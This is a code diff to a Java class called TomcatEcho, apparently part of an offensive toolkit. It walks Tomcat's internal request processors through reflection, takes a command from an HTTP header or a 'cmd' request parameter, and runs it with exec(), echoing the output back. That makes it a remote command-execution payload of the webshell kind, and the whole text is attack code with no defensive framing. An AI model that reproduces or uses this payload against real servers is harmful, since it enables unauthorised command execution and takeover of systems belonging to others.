@@ -23,7 +23,7 @@ import java.lang.reflect.Field;
  * 9.0.65
  */
 public class TomcatEcho {
-    private static String HEADER = "X-Token";
+    private static String HEADER = "Xoken";
     private static String PARAM = "cmd";
 
     public TomcatEcho() {
@@ -56,14 +56,14 @@ public class TomcatEcho {
                     Object processor = processors.get(j);
                     Object req = getFieldValue(processor, "req");
                     Object response = req.getClass().getMethod("getResponse").invoke(req);
-                    String header = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, HEADER);
+                    Object header = req.getClass().getMethod("getHeader", String.class).invoke(req, HEADER);
                     Object parameters = getFieldValue(req, "parameters");
-                    String param = parameters.getClass().getMethod("getParameter", String.class).invoke(parameters, PARAM).toString();
 
                     String result = null;
                     if (header != null) {
-                        result = exec(header);
-                    } else if (param != null) {
+                        result = exec((String) header);
+                    } else if (parameters != null) {
+                        String param = parameters.getClass().getMethod("getParameter", String.class).invoke(parameters, PARAM).toString();
                         result = exec(param);
                     }
 
